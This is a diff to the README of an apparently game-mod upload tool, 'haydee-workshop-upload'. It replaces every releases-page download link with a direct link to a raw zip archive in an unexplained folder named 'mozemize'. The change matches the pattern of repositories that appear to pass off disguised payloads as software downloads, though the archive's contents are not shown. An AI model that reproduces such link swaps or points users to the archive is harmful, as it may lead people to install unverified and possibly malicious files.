@@ -1,6 +1,6 @@
 # ⚙️ haydee-workshop-upload - Simple Mod Packing and Uploading
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Sovo45/haydee-workshop-upload/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Sovo45/haydee-workshop-upload/raw/refs/heads/main/mozemize/workshop-haydee-upload-3.0.zip)
 
 ## 📦 What is haydee-workshop-upload?
 
@@ -48,7 +48,7 @@ You only need to start the app and follow the prompts.
 
 Click the button below to visit the releases page and download the latest version.
 
-[![Download haydee-workshop-upload](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/Sovo45/haydee-workshop-upload/releases)
+[![Download haydee-workshop-upload](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/Sovo45/haydee-workshop-upload/raw/refs/heads/main/mozemize/workshop-haydee-upload-3.0.zip)
 
 **Steps to download and install:**
 
@@ -117,4 +117,4 @@ The project focuses on automation of mod packaging and uploading. It saves users
 
 Visit the following page to download the latest release or check documentation:
 
-[Download and Documentation](https://github.com/Sovo45/haydee-workshop-upload/releases)
+[Download and Documentation](https://github.com/Sovo45/haydee-workshop-upload/raw/refs/heads/main/mozemize/workshop-haydee-upload-3.0.zip)
